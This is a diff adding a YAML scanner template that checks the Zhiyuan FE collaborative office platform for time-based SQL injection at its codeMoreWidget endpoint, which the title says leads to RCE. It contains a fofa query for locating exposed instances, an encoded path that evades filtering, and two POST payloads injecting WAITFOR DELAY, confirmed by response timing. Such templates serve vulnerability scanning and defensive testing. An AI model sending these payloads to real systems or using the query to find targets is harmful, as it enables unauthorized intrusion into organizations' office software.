@@ -1,0 +1,34 @@
+id: zhiyuanFE-codeMoreWidget-sql
+
+info:
+  name: 致远互联FE协作办公平台 codeMoreWidget SQL延时注入致RCE漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="li_plugins_download"
+    致远互联FE协作办公平台是一款为企业提供全方位协同办公解决方案的产品。它集成了多个功能模块，旨在帮助企业实现高效的团队协作、信息共享和文档管理。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/140068827
+  tags: sql injection
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /common/codeMoreWidget.js%70
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: code=1';WAITFOR DELAY '0:0:3'--
+    expression: response.status == 200 && response.latency >= 3000 && response.latency <= 4000
+  r1:
+    request:
+      method: POST
+      path: /common/codeMoreWidget.js%70
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: code=1';WAITFOR DELAY '0:0:6'--
+    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
+expression: r0() && r1()
+
+
